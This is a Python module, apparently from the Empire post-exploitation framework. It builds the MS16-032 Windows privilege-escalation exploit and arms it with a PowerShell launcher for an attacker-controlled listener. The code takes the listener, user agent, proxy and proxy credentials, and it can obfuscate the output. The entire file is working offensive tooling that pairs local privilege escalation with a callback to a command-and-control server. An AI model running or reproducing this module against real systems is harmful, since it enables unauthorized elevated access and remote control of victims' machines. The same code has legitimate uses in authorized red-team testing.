from typing import Dict

from empire.server.core.module_models import EmpireModule
from empire.server.utils.module_util import handle_error_message


class Module:
    @staticmethod
    def generate(
        main_menu,
        module: EmpireModule,
        params: Dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ):
        # read in the common module source code
        script, err = main_menu.modulesv2.get_module_source(
            module_name=module.script_path,
            obfuscate=obfuscate,
            obfuscate_command=obfuscation_command,
        )

        if err:
            return handle_error_message(err)

        # generate the launcher code without base64 encoding
        listener_name = params["Listener"]
        user_agent = params["UserAgent"]
        proxy = params["Proxy"]
        proxy_creds = params["ProxyCreds"]

        # generate the PowerShell one-liner with all of the proper options set
        launcher = main_menu.stagers.generate_launcher(
            listenerName=listener_name,
            language="powershell",
            encode=False,
            userAgent=user_agent,
            proxy=proxy,
            proxyCreds=proxy_creds,
        )
        # need to escape characters
        launcher_code = launcher.replace("`", "``").replace("$", "`$").replace('"', "'")

        script_end = 'Invoke-MS16-032 "' + launcher_code + '"'
        script_end += ';"`nInvoke-MS16032 completed."'

        script = main_menu.modulesv2.finalize_module(
            script=script,
            script_end=script_end,
            obfuscate=obfuscate,
            obfuscation_command=obfuscation_command,
        )
        return script
